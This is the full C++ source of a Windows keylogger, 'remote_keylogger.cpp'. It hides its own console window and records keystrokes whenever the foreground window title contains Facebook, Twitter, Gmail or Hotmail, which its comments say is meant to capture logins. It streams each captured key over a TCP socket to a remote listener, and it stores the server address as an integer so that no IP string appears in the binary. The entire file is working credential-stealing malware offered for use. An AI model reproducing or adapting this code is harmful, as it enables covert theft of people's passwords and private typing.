// ----------------------------------------------------------------------------------------------------------
/* 
**  remote_keylogger.cpp
**
**  This is a user-mode keylogger written in C. Keylogger uses GetKeyState/GetAsyncKeyState functions in 
**  order to capture keystores. Keystrokes are sent through a TCP connection to a remote server. 
**
**
**  ispo - July 2015
*/
// ----------------------------------------------------------------------------------------------------------
#include "stdafx.h"
#include "remote_keylogger.h"                           // VS includes
#include <windows.h>                                    // core includes
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")                     // needed for WSA sockets
#pragma runtime_checks( "[runtime_checks]", off )       // disable /RTC

#define SEND(buf) send(mysock, buf, strlen(buf), 0)     // simple MACRO

SOCKET mysock;                                          // Global Variable

const char num[] = { "0123456789      "                 // a dirty trick to speed-up keystroke lookup
                     ")!@#$%^&*(      " };
// ----------------------------------------------------------------------------------------------------------
/*
**  connect2(): This function opens a TCP connection to the remote server. Note that we use ip as integer
**      and not as string to avoid having a hardcoded IP address in binary.
**
**  Return Value: Upon success, function returns an open SOCKET to the remote server. If any error occurs,
**      function returns an INVALID_SOCKET.
*/
SOCKET connect2(u_long ip, u_short port)                // IP and port are our arguments
{
    WSADATA         wsaData;                            // object for WSA data
    SOCKET          sock = INVALID_SOCKET;              // our socket
    addrinfo        *result = NULL,                     // result
                    *ptr    = NULL,                     // iterator
                    hints;                              // hints
    sockaddr_in     servaddr;                           // server address info


    WSAStartup(MAKEWORD(2,2), &wsaData);                // Init. use of WS2_32.dll 'n request V2.2 of Winsock

    servaddr.sin_family      = AF_INET;                 // IPv4
    servaddr.sin_addr.s_addr = 0x0100007f;//htonl(ip);              // set ip. Don't do that: inet_addr("127.0.0.1");
    servaddr.sin_port        = htons(port);             // and port

    sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP);  // create SOCKET 


   if( connect(sock,(SOCKADDR*)&servaddr,sizeof(servaddr))  // connect to server
            == SOCKET_ERROR )                           // can't connect to server?
            return INVALID_SOCKET;                      //  if so, return error

   // Connection ok. Send a welcome mesage
   send(sock, "Connected...\n", strlen("Connected...\n"), 0);

   return sock;                                         // return socket
}
// ----------------------------------------------------------------------------------------------------------
/*
**  logkeystroke(): This function checks the state of every key in the keyboard, and if it finds that a key
**      is pressed, it send it to the remote server. In order to check the state of the keyboard, the
**      foreground window must contain the word: "Facebook", "Twitter", "Gmail" or "Hotmail". In other words
**      we do keylogging only when user is trying to login somewhere. Of course with this method it's 
**      possible to capture much more than passwords. We can avoid this by searching for more specific texts
**      in foreground window.
**
**  Return Value: Ignored. Function always returns 0.
*/
int logkeystroke( void )                                // function doesn't take any arguments
{
    HWND        hWnd;                                   // foreground window handle
    TCHAR       wtext[ 256 ];                           // window text. 256 chars seem enough
    char        key[ 16 ];                              // store here captured keystroke


    GetWindowText( GetForegroundWindow(), wtext, 256 ); // get window text
    
    if( wcsstr(wtext, L"Facebook") != '\0' ||           // look for potential user logins
        wcsstr(wtext, L"Twitter")  != '\0' || 
        wcsstr(wtext, L"Gmail")    != '\0' ||
        wcsstr(wtext, L"Hotmail")  != '\0')
    {
        memset(key, 0, 16);                             // clear keystroke
        // key[0] = '-';

        // the size of key must be at least 13 ~> 16
        for( int Character=0x8; Character<=0xFF; Character++ )
        if( GetAsyncKeyState( Character ) == -32767 )
        {
            if( (Character>=0x41) && (Character<=0x5A) )
            {
                // we 've a letter (capital or non) between A nnd Z if
                // both SHIFT and CAPSLOCK are pressed Character is non
                // capital. --> Capital if SHIFT XOR CAPSLOCK = 1
                if( (GetKeyState(VK_CAPITAL) & 0x0001) ^ ((GetKeyState(VK_SHIFT) & 0x8000) >> 15) )
                     key[ 0 ] = Character;
                else key[ 0 ] = Character + 32;
            }
            else if( (Character>=0x30) && (Character<=0x39) )
            {
                int a = (GetKeyState(VK_SHIFT) & 0x8000) >> 11;
                key[0] = num[((GetKeyState(VK_SHIFT) & 0x8000) >> 11) + (Character - 0x30) ];
            } 
            else if( (Character>=0xBA) && (Character<=0xDE) )
            {
                // we have a dot
                if( GetKeyState(VK_SHIFT) & 0x8000 )
                {
                   // shift is pressed
                    switch( Character )
                    {
                        case VK_OEM_1: key[ 0 ] = ':'; break;
                        case VK_OEM_2: key[ 0 ] = '?'; break;
                        case VK_OEM_3: key[ 0 ] = '~'; break;
                        case VK_OEM_4: key[ 0 ] = '{'; break;
                        case VK_OEM_5: key[ 0 ] = '|'; break;
                        case VK_OEM_6: key[ 0 ] = '}'; break;
                        case VK_OEM_7: key[ 0 ] = '"'; break;
                        case 0xBE: key[ 0 ] = '>'; break; // VK_OEM_PERIOD
                        case 0xBC: key[ 0 ] = '<'; break; // VK_OEM_COMMA
                        case 0xBD: key[ 0 ] = '_'; break; // VK_OEM_MINUS
                        case 0xBB: key[ 0 ] = '+'; break; // VK_OEM_PLUS
                    }
                }
                else {
                    switch( Character )
                    {
                        case VK_OEM_1: key[ 0 ] = ';';  break;
                        case VK_OEM_2: key[ 0 ] = '/';  break;
                        case VK_OEM_3: key[ 0 ] = '`';  break;
                        case VK_OEM_4: key[ 0 ] = '[';  break;
                        case VK_OEM_5: key[ 0 ] = '\\'; break;
                        case VK_OEM_6: key[ 0 ] = ']';  break;
                        case VK_OEM_7: key[ 0 ] = '\''; break;
                        case 0xBE: key[ 0 ] = '.'; break; // VK_OEM_PERIOD
                        case 0xBC: key[ 0 ] = ','; break; // VK_OEM_COMMA
                        case 0xBD: key[ 0 ] = '-'; break; // VK_OEM_MINUS
                        case 0xBB: key[ 0 ] = '='; break; // VK_OEM_PLUS
                    }
                }
            }
            else if( (Character>=0x21) && (Character<=0x2E) )
            {
                // we have a special key...
                if( (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
                    (Character == VK_INSERT) )
                {
                    strcpy(key, " [CTR INS] ");  break;
                }
                else if( !(GetAsyncKeyState(VK_SHIFT) & 0x8000) )
                {
                    switch( Character )
                    {
                        case VK_PRIOR: strcpy(key, " [PG UP] ");  break;
                        case VK_NEXT:  strcpy(key, " [PG DOWN] ");break;
                        case VK_HOME:  strcpy(key, " [HOME] ");   break;
                        case VK_END:   strcpy(key, " [END] ");    break;
                        case VK_INSERT:strcpy(key, " [INS] ");    break;
                        case VK_DELETE:strcpy(key, " [DELETE] "); break;
                        case VK_UP:    strcpy(key, " [UP] ");     break;
                        case VK_DOWN:  strcpy(key, " [DOWN] ");   break;
                        case VK_LEFT:  strcpy(key, " [LEFT] ");   break;
                        case VK_RIGHT: strcpy(key, " [RIGHT] ");  break;
                    }
                }
                else // shiFt is pressed
                {
                    switch( Character )
                    {
                        case VK_PRIOR: strcpy(key, " [SHF PG UP] ");  break;
                        case VK_NEXT:  strcpy(key, " [SHF PG DOWN] ");break;
                        case VK_HOME:  strcpy(key, " [SHF HOME] ");   break;
                        case VK_END:   strcpy(key, " [SHF END] ");    break;
                        case VK_INSERT:strcpy(key, " [SHF INS] ");    break;
                        case VK_DELETE:strcpy(key, " [SHF DELETE] "); break;
                        case VK_UP:    strcpy(key, " [SHF UP] ");     break;
                        case VK_DOWN:  strcpy(key, " [SHF DOWN] ");   break;
                        case VK_LEFT:  strcpy(key, " [SHF LEFT] ");   break;
                        case VK_RIGHT: strcpy(key, " [SHF RIGHT] ");  break;
                    }
                }
            }
            else if( (Character>=0x60) && (Character<=0x6F) )
            {
                // we are in numpad...
                if( (GetKeyState(VK_NUMLOCK) & 0x0001) &&
                    !(GetAsyncKeyState(VK_SHIFT)  & 0x8000) )
                {
                    // numlock is active and shift is not pressed
                    switch( Character )
                    {
                        case VK_NUMPAD0:   key[ 0 ] = '0'; break;
                        case VK_NUMPAD1:   key[ 0 ] = '1'; break;
                        case VK_NUMPAD2:   key[ 0 ] = '2'; break;
                        case VK_NUMPAD3:   key[ 0 ] = '3'; break;
                        case VK_NUMPAD4:   key[ 0 ] = '4'; break;
                        case VK_NUMPAD5:   key[ 0 ] = '5'; break;
                        case VK_NUMPAD6:   key[ 0 ] = '6'; break;
                        case VK_NUMPAD7:   key[ 0 ] = '7'; break;
                        case VK_NUMPAD8:   key[ 0 ] = '8'; break;
                        case VK_NUMPAD9:   key[ 0 ] = '9'; break;
                        case VK_MULTIPLY : key[ 0 ] = '*'; break;
                        case VK_DIVIDE   : key[ 0 ] = '/'; break;
                        case VK_SUBTRACT : key[ 0 ] = '-'; break;
                        case VK_ADD      : key[ 0 ] = '+'; break;
                        case VK_DECIMAL  : key[ 0 ] = '.'; break;
                        case VK_SEPARATOR: strcpy(key, " [ENTER] ");
                    }
                }
                else
                {
                    // numlock works as special key...
                    switch( Character )
                    {
                        case VK_NUMPAD0: strcpy(key, " [INS] ");     break;
                        case VK_NUMPAD1: strcpy(key, " [END] ");     break;
                        case VK_NUMPAD2: strcpy(key, " [DOWN] ");    break;
                        case VK_NUMPAD3: strcpy(key, " [PG DOWN] "); break;
                        case VK_NUMPAD4: strcpy(key, " [LEFT] ");    break;
                        case VK_NUMPAD5: break;
                        case VK_NUMPAD6: strcpy(key, " [RIGHT] ");   break;
                        case VK_NUMPAD7: strcpy(key, " [HOME] ");    break;
                        case VK_NUMPAD8: strcpy(key, " [UP] ");      break;
                        case VK_NUMPAD9: strcpy(key, " [PG UP] ");   break;
                        case VK_DECIMAL  : strcpy(key, " [DEL] ");   break;
                        case VK_MULTIPLY : key[ 0 ] = '*'; break;
                        case VK_DIVIDE   : key[ 0 ] = '/'; break;
                        case VK_SUBTRACT : key[ 0 ] = '-'; break;
                        case VK_ADD      : key[ 0 ] = '+'; break;
                        case VK_SEPARATOR: strcpy(key, " [ENTER] ");
                    }
                }
            }
            else 
            {
                switch( Character )
                {
                //  case VK_CAPITAL: strcpy(key, " [CAPS LOCK] "); break;
                    case VK_RETURN : strcpy(key, " [ENTER] ");     break;
                    case VK_TAB    : strcpy(key, " [TAB] ");       break;
                    case VK_BACK   : strcpy(key, " [BCKSP] ");      break;
                    case VK_SPACE  : key[ 0 ] = ' ';
                }

            }
        }
    
        if( strlen(key) > 0 )                           // if we got something
            SEND( key );                                // send it to the server
    }

    return 0;                                           // success!
}
// ----------------------------------------------------------------------------------------------------------
int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{   
    // in some windows version a console window may appeared. Dun worry we can hide it
    HWND            hwnd;                               // current window handle


    SetConsoleTitleA("remote keylogger");               // set a console title
    hwnd = FindWindowA(NULL, "remote keylogger");       // search for that window
    if( hwnd ) ShowWindow(hwnd, 0);                     // hide window if exists

    if( (mysock = connect2(0x7f000001, 9999))           // try to connect to server         
        == INVALID_SOCKET )                             // if you cannot
            return -1;                                  // then return

    for( ;; ) {                                         // loop forever
        Sleep(1);                                       // you can prevent 100% CPU usage
        logkeystroke();                                 // get a keystroke
    }

    return 0;                                           // we never reach this point
}
// ----------------------------------------------------------------------------------------------------------
